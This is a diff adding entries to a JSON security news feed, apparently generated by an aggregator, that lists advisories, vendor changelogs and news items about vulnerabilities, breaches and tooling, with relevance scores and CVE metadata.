+    "other_sources": [],
+    "id": "7d248f270632"
+  },
+  {
+    "title": "RUSTSEC-2026-0439: Vulnerability in azure_security_keyvault_keys",
+    "link": "https://rustsec.org/advisories/RUSTSEC-2026-0439.html",
+    "summary": "Rejected authentication challenges can poison the Key Vault scope cache",
+    "published": "2026-11-05T12:00:00+00:00",
+    "source": "RustSec",
+    "category": "advisory",
+    "source_weight": 1.0,
+    "matched_keywords": [
+      "key vault"
+    ],
+    "score": 0.1023379407143593,
+    "bm25": 0.143273117000103,
+    "severity": "",
+    "cvss": 0.0,
+    "cves": [],
+    "packages": [],
+    "corroboration": 1,
+    "other_sources": [],
+    "id": "39407fc76a34"
+  },
+  {
+    "title": "Apple to Start Scanning Publicly Shared iCloud Photos and Files for Harmful Content",
+    "link": "https://thehackernews.com/2026/11/apple-to-start-scanning-publicly-shared.html",
+    "summary": "Apple has revealed that it plans to start checking public iCloud links for harmful content starting with iOS 27.3, iPadOS 27.3, macOS 27.3, and visionOS 27.3. The change specifically applies to scenarios where users share iCloud content, such as photos in iCloud Photos or files in iCloud Drive, by sharing a link and making it accessible to \"Anyone with the link.\" When users choose this option,",
+    "published": "2026-11-05T09:13:28+00:00",
+    "source": "The Hacker News",
+    "category": "aggregator",
+    "source_weight": 0.7,
+    "matched_keywords": [
+      "macos",
+      "apple"
+    ],
+    "score": 0.0551847817399936,
+    "bm25": 0.1103695634799872,
+    "severity": "",
+    "cvss": 0.0,
+    "cves": [],
+    "packages": [],
+    "corroboration": 1,
+    "other_sources": [],
+    "id": "51d9a5c499ab"
+  },
+  {
+    "title": "New pull request overview page in public preview",
+    "link": "https://github.blog/changelog/2026-11-05-new-pull-request-overview-page-in-public-preview",
+    "summary": "On a long pull request, checking what&#8217;s blocking often means scrolling past dozens of comments and timeline events just to reach the merge box. And once you&#8217;re there, you still&#8230; The post New pull request overview page in public preview appeared first on The GitHub Blog .",
+    "published": "2026-11-05T08:00:00+00:00",
+    "source": "GitHub Changelog",
+    "category": "build",
+    "source_weight": 0.3,
+    "matched_keywords": [
+      "github"
+    ],
+    "score": 0.046492794485422755,
+    "bm25": 0.21696637426530618,
+    "severity": "",
+    "cvss": 0.0,
+    "cves": [],
+    "packages": [],
+    "corroboration": 1,
+    "other_sources": [],
+    "id": "cc9dd90ef8be"
+  },
+  {
+    "title": "Secret scanning upgrades detectors, adds SpaceX as partner",
+    "link": "https://github.blog/changelog/2026-11-05-secret-scanning-upgrades-detectors-adds-spacex-as-partner",
+    "summary": "This update expands secret scanning&#8217;s detection coverage: New partner: SpaceX is now a secret scanning partner. New detector: GitHub now detects starlink_public_api_v2_secret. Upgraded detectors: Alibaba, AWS, Google, OpenVSX, Pydantic Services,&#8230; The post Secret scanning upgrades detectors, adds SpaceX as partner appeared first on The GitHub Blog .",
+    "published": "2026-11-05T15:48:50+00:00",
+    "source": "GitHub Changelog",
+    "category": "build",
+    "source_weight": 0.3,
+    "matched_keywords": [
+      "github",
+      "aws"
+    ],
+    "score": 0.04494452198433193,
+    "bm25": 0.17478425216129082,
+    "severity": "",
+    "cvss": 0.0,
+    "cves": [],
+    "packages": [],
+    "corroboration": 1,
+    "other_sources": [],
+    "id": "ee0727a487e6"
+  },
+  {
+    "title": "RUSTSEC-2026-0442: Unsoundness in arrow-data",
+    "link": "https://rustsec.org/advisories/RUSTSEC-2026-0442.html",
+    "summary": "Apache Arrow Rust: Improper validation of RunEndEncoded arrays allows out of bounds reads",
+    "published": "2026-11-05T12:00:00+00:00",
+    "source": "RustSec",
+    "category": "advisory",
+    "source_weight": 1.0,
+    "matched_keywords": [
+      "rust"
+    ],
+    "score": 0.0071428571428571435,
+    "bm25": 0.0,
+    "severity": "",
+    "cvss": 0.0,
+    "cves": [],
+    "packages": [],
+    "corroboration": 1,
+    "other_sources": [],
+    "id": "56a6198fc48a"
+  },
+  {
+    "title": "Arc: DuckDB I/O aliases bypass database RBAC after CVE-2026-47735",
+    "link": "https://github.com/advisories/GHSA-93cm-2v4m-c56c",
+    "summary": "Affected: github.com/basekick-labs/arc. ### Summary The fix for CVE-2026-47735 (released 2026.06.1) is incomplete. It added a DuckDB sandbox (`SET GLOBAL allowed_directories=[<storage root>]; SET GLOBAL enable_external_access=false`) and an Arc SQL-layer denylist of the **literal** functions `read_parquet(` and `arc_partition_agg(`. The sandbox correctly blocks reads **outside** the storage root (OS files, `http://` SSRF), but it allowlists the **entire multi-tenant storage root**, and the SQL denylist still misses the rest of the DuckDB I/O family the original advisory enumerated. As a result, any authenticated token \u2014 including o",
+    "published": "2026-11-04T17:02:37Z",
+    "source": "GHSA \u2014 go",
+    "category": "advisory",
+    "source_weight": 1.0,
+    "matched_keywords": [
+      "github",
+      "token",
+      "ssrf",
+      "cve-"
+    ],
+    "score": 0.6615843449090334,
+    "bm25": 0.3779579509838299,
+    "severity": "medium",
+    "cvss": 6.5,
+    "cves": [
+      "CVE-2026-55098"
+    ],
+    "packages": [
+      "github.com/basekick-labs/arc"
+    ],
+    "corroboration": 2,
+    "other_sources": [
+      {
+        "source": "GHSA \u2014 go",
+        "link": "https://github.com/advisories/GHSA-m3qr-fvp4-78xj",
+        "published": "2026-11-03T16:29:38Z",
+        "category": "advisory"
+      }
+    ],
+    "id": "915e657c8723"
+  },
+  {
+    "title": "Xen Hypervisor Flaws Let One Malicious VM Read and Write Any Other VM's Memory",
+    "link": "https://thehackernews.com/2026/11/xen-hypervisor-flaws-let-one-malicious.html",
+    "summary": "Two flaws in the Xen hypervisor allow a malicious guest virtual machine (VM) to read and write the memory of other VMs on the same host, including dom0. Dom0 is the VM that, by default, has full permissions and manages the others. Patches are out, and there is no known mitigation, the Xen Project said in an&nbsp;advisory&nbsp;on November 3. All Xen versions from 4.6 onward are vulnerable,",
+    "published": "2026-11-04T11:46:27+00:00",
+    "source": "The Hacker News",
+    "category": "aggregator",
+    "source_weight": 0.7,
+    "matched_keywords": [
+      "xen"
+    ],
+    "score": 0.36224740422429985,
+    "bm25": 0.9056185105607497,
+    "severity": "",
+    "cvss": 0.0,
+    "cves": [],
+    "packages": [],
+    "corroboration": 1,
+    "other_sources": [],
+    "id": "a60c29c498ad"
+  },
+  {
+    "title": "Introducing Sysdig AI Defense: See, stop, and prove what agents do",
+    "link": "https://webflow.sysdig.com/blog/introducing-sysdig-ai-defense",
+    "summary": "Sysdig AI Defense is runtime security and governance for every AI agent your teams run, from the laptop where an agent starts its work to the cloud where its actions land. It starts by showing you what\u2019s there. It finds the agents, MCP servers, skills and plugins your people use, including the ones nobody approved, and ties each one to the account and the person behind it.",
+    "published": "2026-11-04T00:00:00+00:00",
+    "source": "Sysdig",
+    "category": "research",
+    "source_weight": 1.0,
+    "matched_keywords": [
+      "teams"
+    ],
+    "score": 0.14954878624493836,
+    "bm25": 0.26171037592864216,
+    "severity": "",
+    "cvss": 0.0,
+    "cves": [],
+    "packages": [],
+    "corroboration": 1,
+    "other_sources": [],
+    "id": "378ee056dde5"
+  },
+  {
+    "title": "Docker Sandboxes vulnerability lets AI agents access sensitive files outside their sandbox (CVE-2026-103916) | Endor Labs",
+    "link": "https://www.endorlabs.com/learn/docker-sandboxes-vulnerability-lets-ai-agents-access-sensitive-files-outside-their-sandbox-cve-2026-103916",
+    "summary": "I discovered a vulnerability in Docker Sandboxes that lets AI coding agents bypass file access restrictions, potentially exposing cloud credentials and other sensitive files on a developer's computer through a routine copy command.",
+    "published": "2026-11-04T15:24:48+00:00",
+    "source": "Endor Labs",
+    "category": "research",
+    "source_weight": 0.9,
+    "matched_keywords": [
+      "docker",
+      "cve-"
+    ],
+    "score": 0.14295095248799294,
+    "bm25": 0.2223681483146557,
+    "severity": "",
+    "cvss": 0.0,
+    "cves": [
+      "CVE-2026-103916"
+    ],
+    "packages": [],
+    "corroboration": 1,
+    "other_sources": [],
+    "id": "ccef41190887"
+  },
+  {
+    "title": "odf-kit: HTML injection leading to XSS in odtToHtml() and odsToHtml() via unescaped style attribute values",
+    "link": "https://github.com/advisories/GHSA-3cgg-c5pp-57h6",
+    "summary": "Affected: odf-kit. ### Summary ODF style attribute values are interpolated into `style=\"...\"` attributes without HTML-escaping in **both** of odf-kit's to-HTML renderers (`odtToHtml` and `odsToHtml`). A double-quote character inside an attacker-controlled style value breaks out of the attribute, allowing arbitrary HTML/attribute injection \u2014 and therefore script execution (XSS) \u2014 from a crafted `.odt` or `.ods` file wherever the rendered output is inserted as HTML, which is the documented purpose of both functions. ### Details #### ODT renderer (`src/odt/to-html/html-renderer.ts`) The renderer has an `escapeH",
+    "published": "2026-11-04T16:14:34Z",
+    "source": "GHSA \u2014 npm",
+    "category": "advisory",
+    "source_weight": 1.0,
+    "matched_keywords": [
+      "xss"
+    ],
+    "score": 0.12855146879577434,
+    "bm25": 0.111783885909369,
+    "severity": "medium",
+    "cvss": 6.1,
+    "cves": [
+      "CVE-2026-113787"
+    ],
+    "packages": [
+      "odf-kit"
+    ],
+    "corroboration": 1,
+    "other_sources": [],
+    "id": "0cf136fa5904"
+  },
+  {
+    "title": "What one organization revealed about AI agent risk",
+    "link": "https://webflow.sysdig.com/blog/a-first-look-under-the-hood-of-ai-agents",
+    "summary": "One company monitored AI agent activity for a month. See what Sysdig AI Defense found, from unapproved agents to unlogged credential reads.",
+    "published": "2026-11-04T00:00:00+00:00",
+    "source": "Sysdig",
+    "category": "research",
+    "source_weight": 1.0,
+    "matched_keywords": [
+      "credential"
+    ],
+    "score": 0.10914102126846388,
+    "bm25": 0.1909967872198118,
+    "severity": "",
+    "cvss": 0.0,
+    "cves": [],
+    "packages": [],
+    "corroboration": 1,
+    "other_sources": [],
+    "id": "1ab9d9f67845"
+  },
+  {
+    "title": "Debian and Ubuntu APT Flaw Lets MitM Attackers Swap Verified Packages and Run Code as Root",
+    "link": "https://thehackernews.com/2026/11/debian-and-ubuntu-apt-flaw-lets-mitm.html",
+    "summary": "A flaw in APT, the package manager for Debian and Ubuntu, allows an attacker who can modify package downloads to swap a checked package for their own. The attacker's code then runs as root, according to advisories that&nbsp;Debian,&nbsp;Ubuntu, and&nbsp;APT's developers&nbsp;published on November 4. The attack needs APT to retry failed downloads, which it does by default from Debian 12 and",
+    "published": "2026-11-04T17:00:46+00:00",
+    "source": "The Hacker News",
+    "category": "aggregator",
+    "source_weight": 0.7,
+    "matched_keywords": [
+      "ubuntu",
+      "debian"
+    ],
+    "score": 0.0974222367703713,
+    "bm25": 0.1948444735407426,
+    "severity": "",
+    "cvss": 0.0,
+    "cves": [],
+    "packages": [],
+    "corroboration": 1,
+    "other_sources": [],
+    "id": "f72f567cab23"
+  },
+  {
+    "title": "GitHub Copilot is now available in Xcode\u2019s coding assistant",
+    "link": "https://github.blog/changelog/2026-11-04-github-copilot-is-now-available-in-xcodes-coding-assistant",
+    "summary": "You can now work with GitHub Copilot directly in Xcode&#8217;s built-in coding assistant, bringing Copilot into your native Xcode workflow. The integration is now in public preview, available starting with&#8230; The post GitHub Copilot is now available in Xcode&#8217;s coding assistant appeared first on The GitHub Blog .",
+    "published": "2026-11-04T19:10:40+00:00",
+    "source": "GitHub Changelog",
+    "category": "build",
+    "source_weight": 0.3,
+    "matched_keywords": [
+      "github"
+    ],
+    "score": 0.031937840739070925,
+    "bm25": 0.149043256782331,
+    "severity": "",
+    "cvss": 0.0,
+    "cves": [],
+    "packages": [],
+    "corroboration": 1,
+    "other_sources": [],
+    "id": "d53634b505a7"
+  },
+  {
+    "title": "CodeQL 2.27.4 improves accuracy and query metadata",
+    "link": "https://github.blog/changelog/2026-11-04-codeql-2-27-4-improves-accuracy-and-query-metadata",
+    "summary": "CodeQL is the static analysis engine behind GitHub code scanning, which finds and remediates security issues in your code. We&#8217;ve recently released CodeQL 2.27.4 with query accuracy improvements across several&#8230; The post CodeQL 2.27.4 improves accuracy and query metadata appeared first on The GitHub Blog .",
+    "published": "2026-11-04T20:04:52+00:00",
+    "source": "GitHub Changelog",
+    "category": "build",
+    "source_weight": 0.3,
+    "matched_keywords": [
+      "github"
+    ],
+    "score": 0.02421555685887765,
+    "bm25": 0.1130059320080957,
+    "severity": "",
+    "cvss": 0.0,
+    "cves": [],
+    "packages": [],
+    "corroboration": 1,
+    "other_sources": [],
+    "id": "f1b2d7334e48"
+  },
+  {
+    "title": "Composer 2.11 Adds Dependency Cooldowns",
+    "link": "https://socket.dev/blog/composer-dependency-cooldowns?utm_medium=feed",
+    "summary": "Composer 2.11 adds dependency cooldowns, joining package managers that delay new releases to reduce supply chain risks while allowing urgent security updates.",
+    "published": "2026-11-03T04:23:21+00:00",
+    "source": "Socket Blog",
+    "category": "advisory",
+    "source_weight": 1.2,
+    "matched_keywords": [
+      "composer",
+      "supply chain"
+    ],
+    "score": 0.4790280065753189,
+    "bm25": 0.9314433461186756,
+    "severity": "",
+    "cvss": 0.0,
+    "cves": [],
+    "packages": [],
+    "corroboration": 1,
+    "other_sources": [],
+    "id": "26202adf58de"
+  },
+  {
+    "title": "Chainstack Reports Production Systems Breach Exposing Customer Data and Password Hashes",
+    "link": "https://thehackernews.com/2026/11/chainstack-reports-production-systems.html",
+    "summary": "Blockchain infrastructure provider Chainstack on Tuesday disclosed that it was targeted in a cyber attack that allowed an unauthorized party to gain access to some parts of its infrastructure. The incident is assessed to be part of a large-scale, artificial intelligence (AI)-powered attack campaign that came to light last week. \"An external attacker gained unauthorized access to part of",
+    "published": "2026-11-03T18:16:19+00:00",
+    "source": "The Hacker News",
+    "category": "aggregator",
+    "source_weight": 0.7,
+    "matched_keywords": [
+      "breach"
+    ],
+    "score": 0.24567637084199553,
+    "bm25": 0.6141909271049889,
+    "severity": "",
+    "cvss": 0.0,
+    "cves": [],
+    "packages": [],
+    "corroboration": 1,
+    "other_sources": [],
+    "id": "49acf98068f7"
+  },
+  {
+    "title": "Synology NAS Devices Targeted in Ransomware Attacks Exploiting Patched DSM Flaw",
+    "link": "https://thehackernews.com/2026/11/synology-nas-devices-targeted-in.html",
+    "summary": "Synology is urging customers to update the DiskStation Manager (DSM) software powering its Network Attached Storage (NAS) devices following ransomware attacks. The Taiwanese vendor said it observed threat actors exploiting a vulnerability patched in December 2024 to target devices running outdated versions of DSM. \"These attacks aim to encrypt data and extort ransom,\" it said in a statement",
+    "published": "2026-11-03T07:43:07+00:00",
+    "source": "The Hacker News",
+    "category": "aggregator",
+    "source_weight": 0.7,
+    "matched_keywords": [
+      "ransomware"
+    ],
+    "score": 0.24061983704388987,
+    "bm25": 0.8020661234796329,
+    "severity": "",
+    "cvss": 0.0,
+    "cves": [],
+    "packages": [],
+    "corroboration": 1,
+    "other_sources": [],
+    "id": "9c59a38943c4"
+  },
+  {
+    "title": "Binance Reveals How Fake Job Interviews and AI Tool Abuse Led to $6.43 Billion Theft",
+    "link": "https://thehackernews.com/2026/11/binance-reveals-how-fake-job-interviews.html",
+    "summary": "Binance on Tuesday said the record-setting theft of $6.43 billion in assets from the world's largest cryptocurrency exchange was the culmination of a \"sophisticated, multi-stage campaign\" that involved the use of a tampered Homebrew installation and recruitment-themed social engineering attack targeting two of its engineers. \"It was not a single isolated breach or a simple phishing incident,\"",
+    "published": "2026-11-03T16:55:58+00:00",
+    "source": "The Hacker News",
+    "category": "aggregator",
+    "source_weight": 0.7,
+    "matched_keywords": [
+      "breach"
+    ],
+    "score": 0.1575367990026607,
+    "bm25": 0.39384199750665183,
+    "severity": "",
+    "cvss": 0.0,
+    "cves": [],
+    "packages": [],
+    "corroboration": 1,
+    "other_sources": [],
+    "id": "62e23c789fbf"
+  }
+]
